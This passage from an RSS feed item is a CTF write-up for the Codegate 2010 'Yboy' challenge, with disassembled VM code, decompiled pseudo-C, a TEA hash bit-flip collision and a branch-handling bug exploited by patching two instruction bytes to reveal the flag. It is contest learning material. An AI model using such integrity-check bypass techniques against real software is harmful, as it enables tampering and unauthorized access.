+0035:   r0 = branch r21, r22    ; if (r21) goto r22
+0036:   r21 = load r20, r0
+0037:   r25 = add r19, r20
+0038:   r0 = nop r0, r0
+0039:   r26 = load r25, r0
+003a:   r26 = sub r21, r26
+003b:   r22 = set_imm 0, 41     ; A
+003c:   r0 = branch r26, r22    ; if (r26) goto r22
+003d:   r23 = set_imm 0, 1      ;
+003e:   r20 = add r20, r23
+003f:   r22 = set_imm 0, 31     ; 1
+0040:   r0 = branch r22, r22    ; if (r22) goto r22
+0041:   r1 = set_imm 0, 41      ; A
+0042:   r0 = outputchar r1, r0
+0043:   r1 = set_imm 0, 63      ; c
+0044:   r0 = outputchar r1, r0
+0045:   r1 = set_imm 0, 63      ; c
+0046:   r0 = outputchar r1, r0
+0047:   r1 = set_imm 0, 65      ; e
+0048:   r0 = outputchar r1, r0
+0049:   r1 = set_imm 0, 73      ; s
+004a:   r0 = outputchar r1, r0
+004b:   r1 = set_imm 0, 73      ; s
+004c:   r0 = outputchar r1, r0
+004d:   r1 = set_imm 0, 20      ;
+004e:   r0 = outputchar r1, r0
+004f:   r1 = set_imm 0, 44      ; D
+0050:   r0 = outputchar r1, r0
+0051:   r1 = set_imm 0, 65      ; e
+0052:   r0 = outputchar r1, r0
+0053:   r1 = set_imm 0, 6e      ; n
+0054:   r0 = outputchar r1, r0
+0055:   r1 = set_imm 0, 69      ; i
+0056:   r0 = outputchar r1, r0
+0057:   r1 = set_imm 0, 65      ; e
+0058:   r0 = outputchar r1, r0
+0059:   r1 = set_imm 0, 64      ; d
+005a:   r0 = outputchar r1, r0
+005b:   r1 = set_imm 0, a       ;
+005c:   r0 = outputchar r1, r0
+005d:   r0 = halt r0, r0
+005e:   r1 = set_imm 0, 47      ; G
+005f:   r0 = outputchar r1, r0
+0060:   r1 = set_imm 0, 72      ; r
+0061:   r0 = outputchar r1, r0
+0062:   r1 = set_imm 0, 65      ; e
+0063:   r0 = outputchar r1, r0
+0064:   r1 = set_imm 0, 65      ; e
+0065:   r0 = outputchar r1, r0
+0066:   r1 = set_imm 0, 74      ; t
+0067:   r0 = outputchar r1, r0
+0068:   r1 = set_imm 0, 7a      ; z
+0069:   r0 = outputchar r1, r0
+006a:   r1 = set_imm 0, 20      ;
+006b:   r0 = outputchar r1, r0
+006c:   r1 = set_imm 0, 68      ; h
+006d:   r0 = outputchar r1, r0
+006e:   r1 = set_imm 0, 61      ; a
+006f:   r0 = outputchar r1, r0
+0070:   r1 = set_imm 0, 63      ; c
+0071:   r0 = outputchar r1, r0
+0072:   r1 = set_imm 0, 6b      ; k
+0073:   r0 = outputchar r1, r0
+0074:   r1 = set_imm 0, 65      ; e
+0075:   r0 = outputchar r1, r0
+0076:   r1 = set_imm 0, 72      ; r
+0077:   r0 = outputchar r1, r0
+0078:   r1 = set_imm 0, 73      ; s
+0079:   r0 = outputchar r1, r0
+007a:   r1 = set_imm 0, 2e      ; .
+007b:   r0 = outputchar r1, r0
+007c:   r1 = set_imm 0, 20      ;
+007d:   r0 = outputchar r1, r0
+007e:   r1 = set_imm 0, 4b      ; K
+007f:   r0 = outputchar r1, r0
+0080:   r1 = set_imm 0, 65      ; e
+0081:   r0 = outputchar r1, r0
+0082:   r1 = set_imm 0, 65      ; e
+0083:   r0 = outputchar r1, r0
+0084:   r1 = set_imm 0, 70      ; p
+0085:   r0 = outputchar r1, r0
+0086:   r1 = set_imm 0, 20      ;
+0087:   r0 = outputchar r1, r0
+0088:   r1 = set_imm 0, 75      ; u
+0089:   r0 = outputchar r1, r0
+008a:   r1 = set_imm 0, 70      ; p
+008b:   r0 = outputchar r1, r0
+008c:   r1 = set_imm 0, 20      ;
+008d:   r0 = outputchar r1, r0
+008e:   r1 = set_imm 0, 74      ; t
+008f:   r0 = outputchar r1, r0
+0090:   r1 = set_imm 0, 68      ; h
+0091:   r0 = outputchar r1, r0
+0092:   r1 = set_imm 0, 65      ; e
+0093:   r0 = outputchar r1, r0
+0094:   r1 = set_imm 0, 20      ;
+0095:   r0 = outputchar r1, r0
+0096:   r1 = set_imm 0, 67      ; g
+0097:   r0 = outputchar r1, r0
+0098:   r1 = set_imm 0, 6f      ; o
+0099:   r0 = outputchar r1, r0
+009a:   r1 = set_imm 0, 6f      ; o
+009b:   r0 = outputchar r1, r0
+009c:   r1 = set_imm 0, 64      ; d
+009d:   r0 = outputchar r1, r0
+009e:   r1 = set_imm 0, 20      ;
+009f:   r0 = outputchar r1, r0
+00a0:   r1 = set_imm 0, 77      ; w
+00a1:   r0 = outputchar r1, r0
+00a2:   r1 = set_imm 0, 6f      ; o
+00a3:   r0 = outputchar r1, r0
+00a4:   r1 = set_imm 0, 72      ; r
+00a5:   r0 = outputchar r1, r0
+00a6:   r1 = set_imm 0, 6b      ; k
+00a7:   r0 = outputchar r1, r0
+00a8:   r1 = set_imm 0, 2e      ; .
+00a9:   r0 = outputchar r1, r0
+00aa:   r1 = set_imm 0, 20      ;
+00ab:   r0 = outputchar r1, r0
+00ac:   r1 = set_imm 0, 53      ; S
+00ad:   r0 = outputchar r1, r0
+00ae:   r1 = set_imm 0, 74      ; t
+00af:   r0 = outputchar r1, r0
+00b0:   r1 = set_imm 0, 61      ; a
+00b1:   r0 = outputchar r1, r0
+00b2:   r1 = set_imm 0, 79      ; y
+00b3:   r0 = outputchar r1, r0
+00b4:   r1 = set_imm 0, 20      ;
+00b5:   r0 = outputchar r1, r0
+00b6:   r1 = set_imm 0, 73      ; s
+00b7:   r0 = outputchar r1, r0
+00b8:   r1 = set_imm 0, 68      ; h
+00b9:   r0 = outputchar r1, r0
+00ba:   r1 = set_imm 0, 61      ; a
+00bb:   r0 = outputchar r1, r0
+00bc:   r1 = set_imm 0, 72      ; r
+00bd:   r0 = outputchar r1, r0
+00be:   r1 = set_imm 0, 70      ; p
+00bf:   r0 = outputchar r1, r0
+00c0:   r1 = set_imm 0, 2e      ; .
+00c1:   r0 = outputchar r1, r0
+00c2:   r1 = set_imm 0, 20      ;
+00c3:   r0 = outputchar r1, r0
+00c4:   r1 = set_imm 0, 44      ; D
+00c5:   r0 = outputchar r1, r0
+00c6:   r1 = set_imm 0, 69      ; i
+00c7:   r0 = outputchar r1, r0
+00c8:   r1 = set_imm 0, 73      ; s
+00c9:   r0 = outputchar r1, r0
+00ca:   r1 = set_imm 0, 6f      ; o
+00cb:   r0 = outputchar r1, r0
+00cc:   r1 = set_imm 0, 62      ; b
+00cd:   r0 = outputchar r1, r0
+00ce:   r1 = set_imm 0, 65      ; e
+00cf:   r0 = outputchar r1, r0
+00d0:   r1 = set_imm 0, 79      ; y
+00d1:   r0 = outputchar r1, r0
+00d2:   r1 = set_imm 0, 20      ;
+00d3:   r0 = outputchar r1, r0
+00d4:   r1 = set_imm 0, 6d      ; m
+00d5:   r0 = outputchar r1, r0
+00d6:   r1 = set_imm 0, 69      ; i
+00d7:   r0 = outputchar r1, r0
+00d8:   r1 = set_imm 0, 73      ; s
+00d9:   r0 = outputchar r1, r0
+00da:   r1 = set_imm 0, 69      ; i
+00db:   r0 = outputchar r1, r0
+00dc:   r1 = set_imm 0, 6e      ; n
+00dd:   r0 = outputchar r1, r0
+00de:   r1 = set_imm 0, 66      ; f
+00df:   r0 = outputchar r1, r0
+00e0:   r1 = set_imm 0, 6f      ; o
+00e1:   r0 = outputchar r1, r0
+00e2:   r1 = set_imm 0, 72      ; r
+00e3:   r0 = outputchar r1, r0
+00e4:   r1 = set_imm 0, 6d      ; m
+00e5:   r0 = outputchar r1, r0
+00e6:   r1 = set_imm 0, 61      ; a
+00e7:   r0 = outputchar r1, r0
+00e8:   r1 = set_imm 0, 74      ; t
+00e9:   r0 = outputchar r1, r0
+00ea:   r1 = set_imm 0, 69      ; i
+00ec:   r1 = set_imm 0, 6f      ; o
+00ed:   r0 = outputchar r1, r0
+00ee:   r1 = set_imm 0, 6e      ; n
+00ef:   r0 = outputchar r1, r0
+00f0:   r1 = set_imm 0, 2e      ; .
+00f1:   r0 = outputchar r1, r0
+00f2:   r1 = set_imm 0, a       ;
+00f3:   r0 = outputchar r1, r0
+00f4:   r1 = set_imm 0, 59      ; Y
+00f5:   r0 = outputchar r1, r0
+00f6:   r1 = set_imm 0, 6f      ; o
+00f7:   r0 = outputchar r1, r0
+00f8:   r1 = set_imm 0, 75      ; u
+00f9:   r0 = outputchar r1, r0
+00fa:   r1 = set_imm 0, 72      ; r
+00fb:   r0 = outputchar r1, r0
+00fc:   r1 = set_imm 0, 20      ;
+00fd:   r0 = outputchar r1, r0
+00fe:   r1 = set_imm 0, 66      ; f
+00ff:   r0 = outputchar r1, r0
+0100:   r1 = set_imm 0, 6c      ; l
+0101:   r0 = outputchar r1, r0
+0102:   r1 = set_imm 0, 61      ; a
+0103:   r0 = outputchar r1, r0
+0104:   r1 = set_imm 0, 67      ; g
+0105:   r0 = outputchar r1, r0
+0106:   r1 = set_imm 0, 20      ;
+0107:   r0 = outputchar r1, r0
+0108:   r1 = set_imm 0, 69      ; i
+0109:   r0 = outputchar r1, r0
+010a:   r1 = set_imm 0, 73      ; s
+010b:   r0 = outputchar r1, r0
+010c:   r1 = set_imm 0, 3a      ; :
+010d:   r0 = outputchar r1, r0
+010e:   r1 = set_imm 0, 20      ;
+010f:   r0 = outputchar r1, r0
+0110:   r29 = set_imm 0, 1      ;
+0111:   r30 = xor r30, r30
+0112:   r1 = load r30, r0
+0113:   r0 = outputchar r1, r0
+0114:   r30 = add r29, r30
+0115:   r31 = set_imm 0, 26     ; &amp;
+0116:   r31 = sub r30, r31
+0117:   r32 = set_imm 1, 12     ; 0112
+0118:   r0 = branch r31, r32    ; if (r31) goto r32
+0119:   r1 = set_imm 0, a       ;
+011a:   r0 = outputchar r1, r0
+011b:   r0 = halt r0, r0
+</pre>
+
+<p>Pseudo C code of the decompiled <em>codefile</em></p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">// data is an int array - int data[0x2000/4]
+// the first 140 bytes of data store the content of "secret.key" file
+printf("Enter password&gt;&gt;");
+r4 = 1337;
+while (!EOF) {
+        r3 = getc();
+        data[r4] = r3;
+        if (r3 == 'n') break;
+        r4++;
+}
+r19 = 1337;
+r20 = 0;
+while (1) {
+        if (r20 == 0x23) goto correctpass;
+        if (data[r20] != data[r19+r20]) goto wrongpass;
+        r20++;
+}
+
+wrongpass:
+printf("Access Deniedn");
+exit(0);
+
+correctpass:
+printf("Greetz hackers. Keep up the good work. Stay sharp. Disobey misinformation.n");
+printf("Your flag is: ");
+for(i=0; i&lt;0x26; i++)
+        print("%c", data[i]);
+printf("n");
+</pre>
+
+<h3 id="c-xbox8217s-tea-hash-collision">c. Xbox’s TEA hash collision</h3>
+
+<p>From the decompiled VM code above, if we could modify the content of <em>codefile</em>, it would be possible to print out the flag inside secret.key stored at <em>data[0]</em>. However, the <em>codefile</em> is protected from being tampered with a hash algorithm.</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">int
+check_code()
+{
+        int result;
+        unsigned int v1;
+        unsigned int v2;
+        unsigned int i;
+
+        hash_block(0x99999999, 0xBBBBBBBB, 0x44444444, 0x55555555, code[0],
+            code[1], &amp;v2, &amp;v1);
+
+        for (i = 2; i &lt;= 32766; i += 2)
+                hash_block(v2, v1, v2, v1, code[i], code[i + 1], (int *) &amp;v2,
+                    (int *) &amp;v1);
+
+        if (v2 != 0x1EC0A9F0 || (result = v1, v1 != 0x9217F034)) {
+                puts("Tampering detected. Prepare for imminent arrest.");
+                exit(0);
+        }
+        return result;
+}
+</pre>
+
+<p>Google the constant <strong>0x61C88647</strong> and searching around, I found that it’s a TEA based hash algorithm. Using TEA hash is bad and there is a weakness in the algorithm in which by flipping the 32nd and 64th bit of a 64 bits block, the hash value will remain the same. <a href="http://www.xbox-linux.org/wiki/17_Mistakes_Microsoft_Made_in_the_Xbox_Security_System#The_TEA_Hash" target="_blank">Xbox was hacked</a> because of this one. (<em>Actually I didn’t know about Xbox’s TEA bits flipping attack. I found this collision by writing a tool doing the brute force on bits flipping of 64 bits block to find the collision. Later, I realized that Yboy is Xbox with two bits flipped</em>)</p>
+
+<p>Now, the next problem is to find how <em>codefile</em> should be patched to print out the flag.</p>
+
+<h3 id="d-branch-instruction-handing-bug">d. Branch instruction handing bug</h3>
+
+<p>The 32nd and 64th bit of a 64 bits block are MSB bits of the opcode field of two consequence instructions. Since the code only uses the least 05 bits in opcode for instruction decode, changing the MSB of the opcode won’t affect the instruction decode part. However, there is a problem with branch instruction handling code which will help us to modify the behavior of branch.</p>
+
+<p>If we look at the VM parsing code, an instruction (4 byes) structure is as the following</p>
+
+<p>[ opcode ] [ output register ] [ imm1 ] [ imm2 ]</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">opcode = (ins &gt;&gt; 24);   //&amp; 0x1f;
+                reg = (ins &gt;&gt; 16) &amp; 0xFF;
+                imm1 = (ins &gt;&gt; 8) &amp; 0xFF;
+                imm2 = (unsigned char) ins;
+</pre>
+
+<p>The least 05 bits of opcode are being used as an index to lookup for the corresponding function from the <em>decode</em> function table (<em>decode[opcode &amp; 0x1f]</em>)</p>
+
+<p>Lets look deeper at the code handling ‘branch’ instruction:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">int branch(int imm1, int imm2)
+{
+        if (imm1)
+                PC = imm2;
+        else
+                PC++;
+        return 0;
+}
+</pre>
+
+<p><strong>Inside main()</strong></p>
+
+<p><strong><a href="http://www.vnsecurity.net/wp/storage/uploads/2010/03/codegatechal2.png"><img class="alignnone size-full wp-image-650" title="codegatechal2" src="http://www.vnsecurity.net/wp/storage/uploads/2010/03/codegatechal2.png" alt="codegatechal2" width="500" height="365" /></a></strong></p>
+
+<p>As we can see, it only uses the least five bits of opcode* ((ins » 24) &amp; 0x1f)* for decode while the full byte *(ins » 24) *is used for comparing later (opcode value for branch is <strong>oxC</strong>).</p>
+
+<p>If we set the MSB of opcode, the opcode would become 0x8c. In this case, the <em>branch() *function is still being called, however, the *(opcode == 0xC)</em> check in <em>main</em>() will be false and <strong>PC will be increased by 1 unexpectedly</strong>.</p>
+
+<h3 id="e-subvert-the-code-flow-to-print-out-the-flag">e. Subvert the code flow to print out the flag</h3>
+
+<p>Look back at the decompiled VM code</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">0020:   r60 = set_imm 0, ff     ; r60 = 255
+0021:   r61 = set_imm 0, 1      ; r61 = 1
+0022:   r4 = set_imm 5, 39      ; r4 = 0x539  (1337)
+0023:   r3 = inputchar r0, r0   ; r3 = getc()
+0024:   r50 = set_imm 0, a      ; r50 = 'n'
+0025:   r0 = store r4, r3          ; data[r4] = r3
+0026:   r0 = nop r0, r0
+0027:   r10 = sub r3, r50        ; r10 = r3 - 'n'
+0028:   r10 = not r10, r0         ; !r10
+0029:   r11 = set_imm 0, 2f     ; r11 = 0x002f
+002a:   r0 = branch r10, r11    ; if (r3 == 'n') goto 002f
+002b:   r4 = add r61, r4           ; r4++
+002c:   r10 = sub r60, r3         ; r10 = 255 - r3
+002d:   r11 = set_imm 0, 23    ; 0x0023
+002e:   r0 = branch r10, r11    ; if (r3 != EOF) goto 0023
+002f:   r19 = set_imm 5, 39     ; r19 = 0x539 (1337)
+0030:   r20 = set_imm 0, 0      ; r20 = 0
+0031:   r21 = set_imm 0, 23    ; r21 = 0x23 (35)
+0032:   r21 = sub r21, r20      ; r21 = r21 - r20
+0033:   r21 = not r21, r0        ; !r21
+0034:   r22 = set_imm 0, 5e     ; 0x005e
+0035:   r0 = branch r21, r22    ; if (r20 == 35) goto 005e //goodpassword
+0036:   r21 = load r20, r0        ; r21 = data[r20]
+0037:   r25 = add r19, r20       ; r25 = 0x539 + r20
+0038:   r0 = nop r0, r0
+0039:   r26 = load r25, r0        ; r26 = data[0x539 + r20]
+003a:   r26 = sub r21, r26        ; r26 = r26 - r21
+003b:   r22 = set_imm 0, 41     ; 0x0041
+003c:   r0 = branch r26, r22    ; if (data[r20] != data[0x539+r20) goto 0041 //badpassword
+003d:   r23 = set_imm 0, 1      ; r23 = 1
+003e:   r20 = add r20, r23       ; r20++
+003f:   r22 = set_imm 0, 31     ; 0x0032
+0040:   r0 = branch r22, r22    ; goto 0032 //loop
+</pre>
+
+<p>The code above read password from stdin, stores it inside <em>data</em> array starting at <em>data[0x539] *then compares the input with the content of *secret.key</em> stored at the beginning of <em>data[0]</em> (35 DWORDS = 140 bytes).</p>
+
+<p><em>What if we modify the MSB bit of branch instruction at 002a?</em></p>
+
+<blockquote>
+  <p>//modify <em>code[2a]</em> from 0x0c000a0b to 0x8c000a0b<br />
+002a: r0 = branch r10, r11 ; if (r3 == ‘n’) goto 002f</p>
+</blockquote>
+
+<p>When ‘n’ is read, the branch() instruction will set PC to the password check code at 002f (<em>002f: r19 = set_imm 5, 39 ; r19 = 0x539</em>). However, because the opcode now is 0x8c instead of 0x0c, PC will be also increased by 1 unexpectedly due to the bug at main loop code mentioned above. Hence, the PC will point to instruction at 0030 (0<em>030: r20 = set_imm 0, 0 ; r20 = 0</em>) instead of 002f.</p>
+
+<p>Since the instruction at 002f is skipped, r19 register will be 0 (default value) instead of 0x539. The VM code becomes</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">//r19 register value is 0 while it's expected to be 0x539
+r20 = 0;
+while (1) {
+        if (r20 == 0x23) goto correctpass;
+        if (data[r20] != data[r19+r20]) goto wrongpass;
+        r20++;
+}
+</pre>
+
+<p>It’s comparing identical data. Yboy Pwned!</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<ul>
+  <li>Copy the <em>codefile</em>, edit it to set the 32nd and 64th bits at offset 0x2a</li>
+</ul>
+
+<blockquote>
+  <p>code[2a] 0x0c000a0b -&gt; 0x8c000a0b<br />
+code[2b] 0x03043d04 -&gt; 0x83043d04</p>
+</blockquote>
+
+<ul>
+  <li>Run the yboy with the new codefile</li>
+  <li>Press enter and get the flag</li>
+</ul>
+
+<blockquote>
+  <p>hugh@codegate-desktop:/tmp/rd$ ./yboy newcodefile<br />
+…<br />
+Enter password»<br />
+Greetz hackers. Keep up the good work. Stay sharp. Disobey misinformation.<br />
+Your flag is: TEA - Toiletpaper Esque Aspirations</p>
+</blockquote>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="http://www.xbox-linux.org/wiki/17_Mistakes_Microsoft_Made_in_the_Xbox_Security_System#The_TEA_Hash" target="_blank">17 Mistakes Microsoft Made in the Xbox Security System</a></li>
+</ul>
+
+<p>Keywords: TEA, VM, Xbox, codegate 2010</p>
+
+
+  ]]></description>
+</item>
+
+</channel>
+</rss>
